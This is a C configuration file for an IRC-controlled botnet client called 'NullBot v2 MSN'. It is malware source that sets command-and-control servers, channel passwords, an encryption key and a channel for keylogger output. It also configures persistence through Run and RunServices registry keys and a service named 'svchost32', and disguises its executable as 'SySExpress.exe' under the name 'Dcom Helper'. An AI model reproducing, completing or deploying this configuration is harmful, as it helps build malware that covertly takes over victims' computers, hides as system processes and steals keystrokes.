// bot configuration
//main
unsigned short bindport = brandom(2000,30000);
char botid[] = "nullesz"; // bot id
char password[] = "msntest"; // bot password
const int maxlogins = 2; // maximum number of simultaneous logins


char *servers[] = {
"127.0.0.1",
"2424.24.24.",
NULL };

int nTimeMs = 60000;
char szBlowfishKey[] = "sympt0m";

//main info
//char server[] = "212.78.85.131"; // server
int port = 6667; // server port
char serverpass[] = ""; // server password
char channel[] = "#dev"; // channel that the bot should join
char chanpass[] = "x"; // channel password
char exploitchan[] = "#dev";		// Keyloger Info Channel

//backup
//char server2[] = ""; // backup server (optional)
int port2 = 44444; // backup server port

//file
BOOL topiccmd = TRUE; // set to TRUE to enable topic commands
BOOL rndfilename = FALSE; // use random file name
char filename[] = "SySExpress.exe"; // destination file name

//autostarts
//registry
BOOL regrun = TRUE; // use the Run registry key for autostart
BOOL regrunservices = TRUE; // use the RunServices registry key for autostart
BOOL AutoStart = TRUE; 
char valuename[] = "Dcom Helper"; // value name for autostart
const bool useservice = TRUE;
const char *servicename = "svchost32";

//other
char prefix = '!'; // command prefix (one character max.)
const int maxaliases = 16; // maximum number of aliases (must be greater than the  number of predefined aliases).
char *authost[] = {"*@*", "\0"}; // wildcard works
char bversion[] = "NullBot v2 MSN"; // Bots !version reply
char version[] = "";

BOOL constnick = FALSE; //If False Then Use OS Nicks
char nickconst[] = "[n]"; // first part to the bot's nick
const int maxrand = 6; // how many random numbers in the nick
